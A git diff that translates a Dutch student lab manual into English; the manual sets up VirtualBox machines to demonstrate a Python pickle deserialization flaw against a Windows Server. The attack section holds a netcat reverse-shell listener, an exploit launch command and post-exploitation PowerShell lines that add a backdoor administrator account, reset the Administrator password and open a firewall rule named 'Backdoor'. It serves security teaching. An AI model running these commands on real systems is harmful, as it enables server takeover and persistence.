@@ -1,138 +1,138 @@
-# Deployment manual - Geautomatiseerd PoC voor Insecure Deserialization (CVE-2025-59287 simulatie)
+# Deployment manual - Automated PoC for Insecure Deserialization (CVE-2025-59287 simulation)
 
-## Inhoudstafel
+## Table of Contents
 
-- [1. Overzicht](#1-overzicht)
+- [1. Overview](#1-overview)
   - [1.1 VMs](#11-vms)
-  - [1.2 Netwerkconfiguratie](#12-netwerkconfiguratie)
-- [2. Deployment (Stappenplan)](#2-deployment-stappenplan)
-  - [2.1 Voorbereiding](#21-voorbereiding)
-  - [2.2 Script Configuratie](#22-script-configuratie)
-  - [2.3 Uitvoering](#23-uitvoering)
-  - [2.4 Automatische afhandeling](#24-automatische-afhandeling)
-  - [2.5 Verificatie](#25-verificatie)
+  - [1.2 Network Configuration](#12-network-configuration)
+- [2. Deployment (Step-by-step Plan)](#2-deployment-step-by-step-plan)
+  - [2.1 Preparation](#21-preparation)
+  - [2.2 Script Configuration](#22-script-configuration)
+  - [2.3 Execution](#23-execution)
+  - [2.4 Automatic Handling](#24-automatic-handling)
+  - [2.5 Verification](#25-verification)
 - [3. Attack - Python Pickle & Insecure Deserialization](#3-attack---python-pickle--insecure-deserialization)
-  - [3.1 Inleiding](#31-inleiding)
+  - [3.1 Introduction](#31-introduction)
   - [3.2 Attack flow](#32-attack-flow)
-  - [3.3 Conclusie & impact](#33-conclusie--impact)
+  - [3.3 Conclusion & Impact](#33-conclusion--impact)
 
-## 1. Overzicht
+## 1. Overview
 
-We demonstreren een Python-based deserialization vulnerability via `pickle`.<br>
-De volledige infrastructuur wordt geautomatiseerd via `VBoxManage`, waardoor de omgeving volledig reproduceerbaar is.
+We demonstrate a Python-based deserialization vulnerability via `pickle`.
+The full infrastructure is automated via `VBoxManage`, making the environment fully reproducible.
 
 ### 1.1 VMs
 
 - Target: Windows Server 2022 (`192.168.56.10`)
 - Attacker: Kali Linux (`192.168.56.20`)
 
-### 1.2 Netwerkconfiguratie
+### 1.2 Network Configuration
 
 - Type: NAT-Network (`NPE_NAT`)
 - Subnet: `192.168.56.0/24`
-- DHCP: Uitgeschakeld (IP's worden statisch geconfigureerd via het script)
+- DHCP: Disabled (IPs are statically configured via the script)
 
 ---
 
-## 2. Deployment (stappenplan)
+## 2. Deployment (Step-by-step Plan)
 
-Volg deze stappen om het labo uit te rollen:
+Follow these steps to deploy the lab:
 
-### 2.1 Voorbereiding
+### 2.1 Preparation
 
-- Zorg er voor dat de gedownloade folder `CYSEC-NPE` op volgende locatie staat en unzip: `C:\Users\<jouw gebruikersnaam>`
-- Download de VDI's naar de map `C:Users\<jouw gebruikersnaam>\CYSEC_NPE`:
-  - Kali: [kali.org](https://www.kali.org/get-kali/#kali-virtual-machines) (plaats de .vdi in de folder `C:Users\<jouw gebruikersnaam>\CYSEC_NPE`)
-  - Windows Server 2022: [OneDrive](https://hogent-my.sharepoint.com/personal/marc_depotter_student_hogent_be/_layouts/15/onedrive.aspx?e=5%3Aa318b1e992d24163b328c73a0d7ce8af&sharingv2=true&fromShare=true&at=9&CT=1778222935612&OR=OWA%2DNT%2DMail&CID=e3e38ddc%2D2a5b%2D413e%2Db372%2D755f20d91818&clickParams=eyJYLUFwcE5hbWUiOiJNaWNyb3NvZnQgT3V0bG9vayBXZWIgQXBwIiwiWC1BcHBWZXJzaW9uIjoiMjAyNjA1MDEwMDEuMDkiLCJPUyI6IldpbmRvd3MgMTEifQ%3D%3D&cidOR=Client&id=%2Fpersonal%2Fmarc%5Fdepotter%5Fstudent%5Fhogent%5Fbe%2FDocuments%2FCybersec%20opdracht&FolderCTID=0x01200081976029B8A8E54CA82EF7E46AE3F54F&view=0)(unzip het bestand en verplaats de .VDI eerst naar de folder `C:Users\<jouw gebruikersnaam>\CYSEC_NPE`!)
-- Zorg dat VirtualBox en de bijbehorende `VBoxManage` tool (onderdeel van de installatie) beschikbaar zijn in je systeempad
+- Ensure that the downloaded folder `CYSEC-NPE` is located at the following location and unzip it: `C:\Users\<your username>`
+- Download the VDIs to the folder `C:Users\<your username>\CYSEC_NPE`:
+  - Kali: [kali.org](https://www.kali.org/get-kali/#kali-virtual-machines) (place the .vdi in the folder `C:Users\<your username>\CYSEC_NPE`)
+  - Windows Server 2022: [OneDrive](https://hogent-my.sharepoint.com/personal/marc_depotter_student_hogent_be/_layouts/15/onedrive.aspx?e=5%3Aa318b1e992d24163b328c73a0d7ce8af&sharingv2=true&fromShare=true&at=9&CT=1778222935612&OR=OWA%2DNT%2DMail&CID=e3e38ddc%2D2a5b%2D413e%2Db372%2D755f20d91818&clickParams=eyJYLUFwcE5hbWUiOiJNaWNyb3NvZnQgT3V0bG9vayBXZWIgQXBwIiwiWC1BcHBWZXJzaW9uIjoiMjAyNjA1MDEwMDEuMDkiLCJPUyI6IldpbmRvd3MgMTEifQ%3D%3D&cidOR=Client&id=%2Fpersonal%2Fmarc%5Fdepotter%5Fstudent%5Fhogent%5Fbe%2FDocuments%2FCybersec%20opdracht&FolderCTID=0x01200081976029B8A8E54CA82EF7E46AE3F54F&view=0)(unzip the file and move the .VDI to the folder `C:Users\<your username>\CYSEC_NPE` first!)
+- Ensure that VirtualBox and the accompanying `VBoxManage` tool (part of the installation) are available in your system path
 
-### 2.2 Script configuratie
+### 2.2 Script Configuration
 
-- Open `server-install.ps1` in een editor naar keuze (bijv. VS Code) vanop de locatie `C:Users\<jouw gebruikersnaam>\CYSEC_NPE\scripts`
-- Controleer of de paden naar de vulnerability scripts (`$WSUS_SCRIPT`, etc.) en VDI's correct naar de werkelijke paden op jouw systeem verwijzen
+- Open `server-install.ps1` in an editor of your choice (e.g., VS Code) from the location `C:\Users\<your username>\CYSEC_NPE\scripts`
+- Check whether the paths to the vulnerability scripts (`$WSUS_SCRIPT`, etc.) and VDIs correctly point to the actual paths on your system
 
-### 2.3 Uitvoering
+### 2.3 Execution
 
-- Open de `Terminal` app
-- Navigeer naar de correcte map: `cd C:Users\<jouw gebruikersnaam>\CYSEC_NPE\scripts`
-- Voer het install script uit met: `./server-install.ps1`
+- Open the `Terminal` app
+- Navigate to the correct folder: `cd C:Users\<jouw gebruikersnaam>\CYSEC_NPE\scripts`
+- Execute the installation script with: `./server-install.ps1`
 
-### 2.4 Automatische afhandeling
+### 2.4 Automatic Handling
 
-- Het script ruimt oude VM-sessies op.
-- Het NAT-netwerk wordt geconfigureerd zonder DHCP om IP-conflicten te vermijden
-- De schijven worden gekloond (zodat de Master VDI's intact blijven)
-- De VM's worden geconfigureerd met 4GB RAM, 2 CPU's en de juiste netwerkadapter
-- Na het booten injecteert het script de statische IP's en schakelt het de Windows Firewall uit voor lab-doeleinden
-- De scripts worden naar de correcte VM's gekopieërd
-  - **Let op:** het `exploit-python.py` script wordt automatisch naar de home-map van de Kali-gebruiker gekopieerd (`/home/kali/`).<br>
-    Het deployment-script stelt de rechten automatisch in op `rwx` voor de `kali` gebruiker.
-    Op de Windows Server kan je de scripts terug vinden onder `C:\`.
-- De vulnerability-services (WSUS & Python server) worden automatisch gestart
+- The script cleans up old VM sessions
+- The NAT network is configured without DHCP to prevent IP conflicts
+- The disks are cloned (so that the Master VDIs remain intact)
+- The VMs are configured with 4GB RAM, 2 CPUs, and the correct network adapter
+- After booting, the script injects the static IPs and disables the Windows Firewall for lab purposes
+- The scripts are copied to the correct VMs
+  - **Note:** the `exploit-python.py` script is automatically copied to the Kali user's home directory (`/home/kali/`).<br>
+    The deployment script automatically sets permissions to `rwx` for the `kali` user.
+    On the Windows Server, you can find the scripts under `C:\`.
+- The vulnerability services (WSUS & Python server) are started automatically
 
-### 2.5 Verificatie
+### 2.5 Verification
 
-- Wacht tot het install script is afgerond
-- Controleer de getoonde IP-adressen
+- Wait until the installation script finishes
+- Verify the displayed IP addresses
 
 ---
 
 ## 3. Attack - Python Pickle & Insecure Deserialization
 
-### 3.1 Inleiding
+### 3.1 Introduction
 
-In deze aanval maken we gebruik van de `pickle` module in Python.
-Pickle wordt veel gebruikt om Python-objecten te converteren naar een byte-stream (serialisatie) en weer terug (deserialisatie).
-Het grote gevaar van `pickle` is dat het niet alleen data opslaat, maar ook instructies over hoe het object gereconstrueerd moet worden.
-Een aanvaller kan een specifiek "ge-pickle-d" object maken dat tijdens het uitpakken op de server direct een systeemcommando uitvoert.
-Dit maakt het een klassiek en zeer krachtig voorbeeld van een _Arbitrary Code Execution_ kwetsbaarheid.
+In this attack, we make use of the `pickle` module in Python.
+`Pickle` is widely used to convert Python objects into a byte stream (serialization) and back (deserialization).
+The major danger of `pickle` is that it not only stores data, but also instructions on how the object should be reconstructed.
+An attacker can craft a specific "pickled" object that directly executes a system command upon unpackaging on the server.
+This makes it a classic and highly potent example of an _Arbitrary Code Execution_ vulnerability.
 
 ### 3.2 Attack flow
 
-**1. Indien nog niet gebeurt, start de Windows Server en Kali Linux VM**
+**1. If not done already, start the Windows Server and Kali Linux VM**
 
-> Nota: normaliter worden de VM's via het `./server-install.ps1` script gestart.
+> Note: normally, the VMs are started via the `./server-install.ps1` script
 
 ```bash
 VBoxManage startvm "WSUS-Target" --type gui
 VBoxManage startvm "Kali-Linux" --type gui
 ```
 
-**2. Bereid de Reverse Shell Listener voor**
+**2. Prepare the Reverse Shell Listener**
 
-Open een terminal op Kali en start een listener.
+Open a terminal on Kali and start a listener.
 
 ```bash
 nc -lvnp 4444
 ```
 
-**3. Voer de exploit uit**
+**3. Execute the exploit**
 
-Open een tweede terminal op Kali en start de aanval:
+Open a second terminal on Kali and launch the attack:
 
 ```bash
 python3 exploit-python.py
 ```
 
-**4. Resultaat**
+**4. Result**
 
-Reverse shell verkregen op Kali.<br>
-Op dit moment kunnen we aan alle gevoelige informatie op de server.
+Reverse shell obtained on Kali.
+At this point, we can access all sensitive information on the server.
 
-**1.** Nieuwe user en paswoord aanmaken
+**1.** Create a new user and password
 
 ```powershell
 net user Pawny HappyHacking! /add
 net localgroup Administrators Pawny /add
 ```
 
-**2** Wachtwoord van de Administrator wijzigen
+**2** Change the Administrator's password
 
 ```powershell
 net user Administrator YouGotPawned!
 ```
 
-**3** Verdediging uitschakelen: Firewall manipulatie
+**3** Disable defenses: Firewall manipulation
 
 ```powershell
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
@@ -140,11 +140,11 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
 New-NetFirewallRule -DisplayName "Backdoor" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow
 ```
 
-**4** The sky is the limit (RDP activeren via de Shell, documenten op de server versleutelen of simpelweg overschrijven (ransomware),...)
+**4** The sky is the limit (activate RDP via the Shell, encrypt documents on the server or simply overwrite them (ransomware),...)
 
-### 3.3 Conclusie & impact
+### 3.3 Conclusion & Impact
 
-De succesvolle uitvoering van exploit.py laat zien dat een aanvaller met slechts één netwerkpakket de volledige controle over de server kan overnemen.
-In deze simulatie hebben we een Reverse Shell verkregen. Dit betekent dat de server zelf een verbinding opzet naar de attacker,
-wat vaak niet door firewalls wordt geblokkeerd (omdat het uitgaand verkeer is). De impact is enorm: de attacker kan bestanden stelen,
-de WSUS-configuratie aanpassen om malware te verspreiden naar andere clients, of de server gebruiken als springplank naar de rest van het bedrijfsnetwerk.
+The successful execution of `exploit.py` shows that an attacker can gain full control over the server with just a single network packet.
+In this simulation, we obtained a Reverse Shell. This means the server itself establishes a connection to the attacker,
+which is often not blocked by firewalls (as it is outbound traffic). The impact is huge: the attacker can steal files,
+modify the WSUS configuration to distribute malware to other clients, or use the server as a stepping stone to the rest of the corporate network.
